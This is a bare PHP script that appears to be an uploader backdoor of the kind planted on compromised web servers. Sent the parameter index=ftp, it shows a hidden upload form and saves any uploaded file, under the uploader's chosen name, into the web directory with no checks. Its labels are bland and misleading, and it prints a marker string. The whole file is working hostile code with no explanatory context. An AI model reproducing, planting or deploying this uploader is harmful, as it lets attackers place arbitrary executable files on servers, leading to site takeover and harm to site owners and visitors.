<?php
echo "BARACUS";
if
(isset
(
$_REQUEST['index']) && 
$_REQUEST['index']=="ftp"){
echo "<h2></h2><hr>";
echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
<label for=\"file\"></label>
<input type=\"file\" name=\"file\" id=\"file\" />
<br />
<input type=\"submit\" name=\"default\" value=\"value\">
</form>";

{
move_uploaded_file($_FILES["file"]["tmp_name"],
"" . $_FILES["file"]["name"]);
echo "Rand(100-100): " . "" . $_FILES["file"]["name"];
echo"<hr>";
}
}

?>